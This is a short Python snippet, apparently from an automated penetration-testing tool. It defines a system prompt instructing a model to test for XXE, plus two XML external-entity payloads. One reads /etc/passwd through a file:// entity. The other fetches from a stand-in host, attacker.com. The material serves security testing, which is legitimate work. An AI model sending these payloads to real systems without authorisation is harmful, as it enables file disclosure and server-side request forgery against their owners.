XXE_SYSTEM_PROMPT = """
When testing for XXE, submit XML payloads with external entities and analyze for file disclosure or SSRF.
"""
XXE_PAYLOADS = [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/evil'>]><foo>&xxe;</foo>",
] 